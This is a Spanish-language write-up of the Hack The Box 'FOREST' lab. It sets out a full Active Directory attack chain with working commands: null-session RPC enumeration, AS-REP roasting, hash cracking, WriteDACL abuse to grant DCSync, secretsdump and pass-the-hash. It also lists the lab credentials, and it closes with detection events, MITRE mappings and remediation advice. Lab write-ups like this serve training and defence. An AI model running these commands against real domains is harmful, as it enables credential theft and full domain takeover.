# Informe de Seguridad - Evaluación de Host "FOREST"

## 1. Resumen Ejecutivo

Se ha realizado una evaluación de seguridad sobre el host "FOREST", identificado como un Controlador de Dominio en un entorno Active Directory.

Durante el análisis se identificó una cadena de ataque basada en:

- Enumeración de usuarios vía RPC con sesión nula
- Ataque AS-REP Roasting
- Acceso remoto mediante WinRM
- Escalada de privilegios mediante abuso de ACL (WriteDACL)
- Compromiso total del dominio mediante DCSync

### Impacto

- Compromiso de cuentas de dominio  
- Escalada de privilegios a nivel dominio  
- Extracción de hashes NTLM  
- Acceso completo como Administrador  

### Nivel de riesgo: **CRÍTICO**

---

## 2. Alcance

- Objetivo: FOREST  
- Dominio: htb.local  
- Sistema: Windows Server 2016  
- Tipo de prueba: Black Box  
- Metodología: Enumeración → Explotación → Escalada  

---

## 3. Enumeración

### 3.1 Escaneo de puertos

    nmap -p- --open -sS -Pn --min-rate 5000 <IP>

### Puertos relevantes:

- 53 – DNS  
- 88 – Kerberos  
- 135 – RPC  
- 389 – LDAP  
- 445 – SMB  
- 5985 – WinRM  
- 3268 – Global Catalog  

👉 Indica entorno Active Directory

---

### 3.2 Enumeración RPC

    rpcclient -U "" <IP> -N -c "enumdomusers"

Resultado:

- Enumeración de usuarios del dominio mediante sesión nula  

Usuarios relevantes:

- svc-alfresco  
- sebastien  
- lucinda  

👉 Fallo crítico: **permite enumeración sin autenticación**

---

## 4. Explotación (Acceso inicial)

### 4.1 AS-REP Roasting

    GetNPUsers.py htb.local/ -no-pass -usersfile users.txt

Resultado:

- Hash obtenido para usuario:

    svc-alfresco

---

### 4.2 Cracking de hash

    john --format=krb5asrep --wordlist=rockyou.txt hash.txt

Resultado:

- Credenciales válidas:

    svc-alfresco : s3rvice

---

### 4.3 Acceso remoto

    evil-winrm -i <IP> -u svc-alfresco -p s3rvice

Resultado:

- Acceso como usuario de dominio  

---

## 5. Escalada de privilegios

Aquí está lo importante del lab.

---

### 5.1 Enumeración con BloodHound

Se ejecuta:

    SharpHound.exe --CollectionMethods All

Resultado:

- Identificación de ruta de ataque mediante ACL  

---

### 5.2 Hallazgo crítico

Cadena de privilegios:

    svc-alfresco
        ↓
    SERVICE ACCOUNTS
        ↓
    PRIVILEGED IT ACCOUNTS
        ↓
    ACCOUNT OPERATORS
        ↓
    Exchange Windows Permissions
        ↓
    WriteDACL sobre dominio

👉 Esto permite modificar permisos del dominio

---

### 5.3 Abuso de WriteDACL

Creación de usuario:

    net user john password123! /add /domain

Asignación a grupo:

    net group "Exchange Windows Permissions" john /add

---

### 5.4 Asignación de privilegios DCSync

    Add-DomainObjectAcl -PrincipalIdentity john -Rights DCSync

Resultado:

- Usuario con permisos de replicación de dominio  

---

### 5.5 Ataque DCSync

    secretsdump.py htb.local/john@<IP>

Resultado:

- Dump completo de hashes NTLM  

---

### 5.6 Pass-the-Hash

    evil-winrm -i <IP> -u Administrator -H <hash>

Resultado:

    NT AUTHORITY\SYSTEM

---

## 6. Evidencias

- Enumeración de usuarios vía RPC  
- Hash AS-REP obtenido  
- Credenciales crackeadas  
- Acceso WinRM  
- BloodHound path identificado  
- Dump de hashes de dominio  
- Acceso como Administrador  

---

## 7. Visión SOC (Detección y Monitorización)

Aquí es donde te diferencias de un script kiddie.

---

### 7.1 Indicadores de compromiso (IoC)

- Enumeración RPC anónima  
- Solicitudes Kerberos AS-REP sin preautenticación  
- Accesos WinRM desde IP externa  
- Modificación de ACL en dominio  
- Replicación sospechosa (DCSync)  

---

### 7.2 Logs relevantes

#### Security Log

    Event ID 4768 → Solicitud TGT (AS-REP)
    Event ID 4624 → Logon exitoso
    Event ID 4672 → Privilegios elevados

---

#### Directory Services

    Event ID 4662 → Acceso a objetos AD (DCSync)

---

#### PowerShell

    Event ID 4104 → Ejecución de scripts (PowerView)

---

### 7.3 Técnicas MITRE ATT&CK

- T1087 – Account Discovery  
- T1558.004 – AS-REP Roasting  
- T1078 – Valid Accounts  
- T1484 – Domain Policy Modification  
- T1003.006 – DCSync  
- T1550 – Pass-the-Hash  

---

## 8. Recomendaciones

### 8.1 Kerberos

- Habilitar preautenticación en todas las cuentas  
- Monitorizar AS-REP  

---

### 8.2 RPC

- Deshabilitar enumeración anónima  

---

### 8.3 Active Directory

- Revisar permisos ACL críticos  
- Eliminar privilegios innecesarios  
- Auditar grupos como "Exchange Windows Permissions"  

---

### 8.4 Monitorización

- Alertas por DCSync  
- Monitorización de cambios en ACL  
- Detección de uso de herramientas como BloodHound  

---

## 9. Conclusión

Cadena de ataque:

1. Enumeración RPC  
2. AS-REP Roasting  
3. Acceso inicial  
4. Análisis con BloodHound  
5. Abuso de ACL (WriteDACL)  
6. DCSync  
7. Pass-the-Hash  

El compromiso fue posible debido a:

- Configuración insegura de Kerberos  
- Enumeración anónima permitida  
- Permisos excesivos en Active Directory  
- Falta de monitorización  

Resultado final: **compromiso total del dominio**
